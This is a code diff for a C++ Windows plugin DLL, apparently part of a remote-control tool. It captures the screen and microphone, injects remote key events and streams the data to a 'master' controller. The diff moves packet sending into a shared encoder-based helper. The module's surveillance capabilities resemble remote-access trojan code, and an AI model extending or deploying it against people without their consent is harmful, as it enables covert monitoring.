@@ -19,6 +19,7 @@
 #include <shlobj.h>
 #include <gdiplus.h>
 #include "../../Common/Config.h"
+#include "../../Common/NetworkHelper.h"
 
 #include "DXGICapture.h"
 
@@ -216,30 +217,14 @@ void DrawMouseCursor(HDC hMemDC, int screenX, int screenY, int width, int height
 
 // 发送响应数据到主控端（Master）
 bool SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
-    PkgHeader header;
-    memcpy(header.flag, "FRMD26?", 7);
-    header.originLen = sizeof(CommandPkg) - 1 + len;
-    header.totalLen = sizeof(PkgHeader) + header.originLen;
-    
-    std::vector<char> buffer(header.totalLen);
-    memcpy(buffer.data(), &header, sizeof(PkgHeader));
-    
-    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
-    pkg->cmd = cmd;
-    pkg->arg1 = len;
-    if (len > 0 && data) {
-        memcpy(pkg->data, data, len);
-    }
-
-    const char* pData = buffer.data();
-    int remaining = (int)buffer.size();
-    while (remaining > 0) {
-        int sent = send(s, pData, remaining, 0);
-        if (sent == SOCKET_ERROR || sent == 0) return false;
-        pData += sent;
-        remaining -= sent;
-    }
+    if (s == INVALID_SOCKET) return false;
+    SendPkg(s, cmd, data, len, 0, 0, g_pProtocolEncoder);
     return true;
+}
+
+void SendResponseEx(SOCKET s, uint32_t cmd, const void* data, int len, uint32_t arg2) {
+    if (s == INVALID_SOCKET) return;
+    SendPkg(s, cmd, data, len, len, arg2, g_pProtocolEncoder);
 }
 
 // 录音回调函数
@@ -702,32 +687,7 @@ void ScreenThread(SOCKET s) {
                 // 或者修改 SendResponse? SendResponse 是 Utils 里的。
                 // 或者直接在这里构造包。
                 
-                size_t bodySize = sizeof(CommandPkg) - 1 + finalBuf.size();
-                std::vector<char> pkgBuf(sizeof(PkgHeader) + bodySize);
-                
-                PkgHeader* hdr = (PkgHeader*)pkgBuf.data();
-                memcpy(hdr->flag, "FRMD26?", 7);
-                hdr->totalLen = (int)pkgBuf.size();
-                hdr->originLen = (int)bodySize;
-                
-                CommandPkg* pkg = (CommandPkg*)(pkgBuf.data() + sizeof(PkgHeader));
-                pkg->cmd = CMD_SCREEN_CAPTURE;
-                pkg->arg1 = (uint32_t)finalBuf.size();
-                pkg->arg2 = isDiff ? 1 : 0;
-                memcpy(pkg->data, finalBuf.data(), finalBuf.size());
-                
-                const char* pData = pkgBuf.data();
-                int remaining = (int)pkgBuf.size();
-                while (remaining > 0) {
-                    int sentBytes = send(s, pData, remaining, 0);
-                    if (sentBytes == SOCKET_ERROR || sentBytes == 0) {
-                        tjFree(jpegBuf);
-                        g_screenRunning = false;
-                        break;
-                    }
-                    pData += sentBytes;
-                    remaining -= sentBytes;
-                }
+                SendPkg(s, CMD_SCREEN_CAPTURE, finalBuf.data(), (int)finalBuf.size(), (uint32_t)finalBuf.size(), isDiff ? 1 : 0);
                 
                 tjFree(jpegBuf);
                 sent = true;
@@ -1112,7 +1072,13 @@ void ProcessKeyEvent(RemoteKeyEvent* ev) {
     }
 }
 
-extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
+namespace Formidable {
+    ProtocolEncoder* g_pProtocolEncoder = nullptr;
+}
+
+extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg, ProtocolEncoder* encoder) {
+    g_pProtocolEncoder = encoder;
+    g_socket = s;
     if (pkg->cmd == CMD_VOICE_STREAM) {
         if (pkg->arg1 == 1) { // 1 = Start
             StartVoice(s);
